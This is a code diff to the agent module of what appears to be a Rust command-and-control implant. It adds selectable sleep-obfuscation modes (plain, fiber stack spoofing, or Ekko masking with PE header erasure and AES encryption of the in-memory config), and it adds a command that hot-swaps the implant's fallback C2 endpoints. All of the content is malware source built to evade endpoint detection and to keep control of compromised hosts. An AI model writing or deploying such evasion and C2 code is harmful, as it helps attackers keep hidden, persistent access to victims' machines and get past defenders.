@@ -1,4 +1,3 @@
-// src/agent/mod.rs
 pub mod config;
 pub mod handlers;
 pub mod scripting;
@@ -44,6 +43,24 @@ use self::jobs::JobManager;
 // Enhanced Sleep Mask: encrypts config + process heap, uses fiber-based
 // stack spoofing so the agent's call stack is clean during sleep.
 async fn sleep_with_mask(config: C2Config, duration: std::time::Duration) -> C2Config {
+    // "plain"/"none": operator explicitly disabled sleep obfuscation at
+    // build time - plain sleep, no config encryption, no stack/PE masking.
+    if matches!(config.sleep_mask.as_str(), "plain" | "none") {
+        return tokio::task::spawn_blocking(move || {
+            std::thread::sleep(duration);
+            config
+        }).await.unwrap_or_else(|_| crate::agent::config::load());
+    }
+    // "spoofed-stack"/"foliage": fiber stack spoof only - no Ekko
+    // timer-queue wake and no PE header erasure. The config is still
+    // AES-encrypted during the sleep below.
+    let spoof_only = matches!(config.sleep_mask.as_str(), "spoofed-stack" | "foliage");
+    // Unknown mask spellings fail safe toward maximum masking (Ekko); note
+    // it so debug builds can catch a typo'd builder/config value.
+    if !spoof_only && config.sleep_mask != aes_str!("ekko") {
+        tracing::debug!("{}: '{}' {}",
+            aes_str!("Unknown sleep_mask"), config.sleep_mask, aes_str!("- falling back to ekko"));
+    }
     let config_bytes = serde_json::to_vec(&config).unwrap_or_default();
     
     // Perform all cryptographic operations inside spawn_blocking so key material
@@ -65,9 +82,14 @@ async fn sleep_with_mask(config: C2Config, duration: std::time::Duration) -> C2C
         let ciphertext = match cipher.encrypt(nonce, config_bytes.as_ref()) {
             Ok(ct) => ct,
             Err(_) => {
-                // Encryption failed - sleep with Ekko mask (PE header erasure +
-                // timer dispatch + fiber stack spoof) and return config as-is.
-                evasion::ekko_sleep(sleep_ms);
+                // Encryption failed - sleep masked and return config as-is.
+                if spoof_only {
+                    evasion::sleep_with_spoofed_stack(sleep_ms);
+                } else {
+                    // Ekko mask (PE header erasure + timer dispatch + fiber
+                    // stack spoof).
+                    evasion::ekko_sleep(sleep_ms);
+                }
                 return config_bytes;
             }
         };
@@ -116,7 +138,13 @@ async fn sleep_with_mask(config: C2Config, duration: std::time::Duration) -> C2C
         // The C2Config JSON is already AES-256-GCM encrypted above (Gap 1
         // for data). Full .text content encryption is deferred to reflective-
         // load deployments (see docs/evasion.md).
-        evasion::ekko_sleep(sleep_ms);
+        if spoof_only {
+            // Fiber stack spoof WITHOUT the Ekko timer-queue wake / PE
+            // header erasure (config.example.toml: "spoofed-stack").
+            evasion::sleep_with_spoofed_stack(sleep_ms);
+        } else {
+            evasion::ekko_sleep(sleep_ms);
+        }
         
         // 3. Decrypt config
         let aes_key_decrypt = aes_gcm::Key::<Aes256Gcm>::from_slice(&key);
@@ -478,6 +506,13 @@ pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
                             base_jitter_min = min;
                             base_jitter_max = max;
                         },
+                        AgentAction::UpdateFallback(fb) => {
+                            // Hot-swap: re-seed the fallback manager. The live
+                            // session is untouched; the new endpoints are used
+                            // from the next reconnect of the outer loop.
+                            config.fallback = fb;
+                            fb_mgr = fallback::FallbackManager::from_config(&config);
+                        },
                         AgentAction::SetMode(active) => {
                             is_active_mode = active;
                         },
@@ -519,7 +554,7 @@ pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
 
 /// HTTP(S) transport main loop. Uses polling instead of persistent connections.
 async fn run_http_mode(
-    config: crate::common::C2Config,
+    mut config: crate::common::C2Config,
     hwid: String,
     exe_id: String,
     verify_key: VerifyingKey,
@@ -654,6 +689,13 @@ async fn run_http_mode(
                     match action {
                         handlers::AgentAction::UpdateConfig(s, min, max) => {
                             base_sleep = s; base_jitter_min = min; base_jitter_max = max;
+                        }
+                        handlers::AgentAction::UpdateFallback(fb) => {
+                            // HTTP mode registers once and then polls a fixed
+                            // base URL; the new list is stored and re-seeds the
+                            // manager but cannot retarget the live poll loop.
+                            config.fallback = fb;
+                            fb_mgr = fallback::FallbackManager::from_config(&config);
                         }
                         handlers::AgentAction::SetMode(_) => {} // No beacon mode in HTTP
                         handlers::AgentAction::None => {}
